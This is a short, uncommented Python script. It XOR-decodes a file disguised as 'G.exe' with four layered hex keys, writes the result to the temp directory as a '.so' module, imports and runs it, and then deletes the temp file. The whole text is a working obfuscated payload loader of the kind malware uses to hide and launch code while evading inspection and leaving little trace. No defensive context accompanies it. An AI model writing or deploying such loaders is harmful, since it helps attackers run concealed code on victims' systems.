import os,sys,tempfile,importlib.util
x=bytes.fromhex('78fc9ec3da556f05')
y=bytes.fromhex('4907b287c3ebc199')
z=bytes.fromhex('a8a7c61617537d78')
w=bytes.fromhex('6418615b3a250921')
def _0x(a):
    for i in range(len(a)):
        a[i]^=w[i%len(w)]
        a[i]^=z[i%len(z)]
        a[i]^=y[i%len(y)]
        a[i]^=x[i%len(x)]
    return a
with open('G.exe','rb') as f:
    data=bytearray(f.read())
data=_0x(data)
t=tempfile.gettempdir()
s=os.path.join(t,'G.so')
with open(s,'wb') as f:
    f.write(data)
sp=importlib.util.spec_from_file_location('G',s)
m=importlib.util.module_from_spec(sp)
sys.modules['G']=m
sp.loader.exec_module(m)
os.remove(s)
if hasattr(m,'main'):
    m.main()
elif hasattr(m,'run'):
    m.run()
else:
    print('Module loaded!')
